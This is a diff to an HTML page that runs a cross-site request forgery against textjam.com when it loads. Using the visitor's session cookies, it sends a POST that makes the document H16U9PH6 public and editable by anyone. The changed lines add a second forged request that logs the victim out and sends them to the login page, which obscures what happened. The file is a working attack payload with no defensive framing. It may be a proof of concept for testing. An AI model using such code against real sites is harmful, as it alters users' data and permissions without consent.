@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <script>
-// Auto-execute on page load
+// Auto-execute on page load - make document public/editor
 fetch('https://textjam.com/api/doc/H16U9PH6/access/public/editor', {
     method: 'POST',
     credentials: 'include',
@@ -11,11 +11,20 @@ fetch('https://textjam.com/api/doc/H16U9PH6/access/public/editor', {
     body: JSON.stringify({})
 });
 
-// Redirect after sending request
+// Then logout
 setTimeout(() => {
-    window.location.href = 'https://textjam.com/doc/H16U9PH6?message=Document+now+public';
-}, 1500);
+    fetch('https://textjam.com/api/auth/logout', {
+        method: 'POST',
+        credentials: 'include',
+        mode: 'no-cors',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({})
+    }).then(() => {
+        window.location.href = 'https://textjam.com/login';
+    });
+}, 500);
 </script>
+
 
 
 
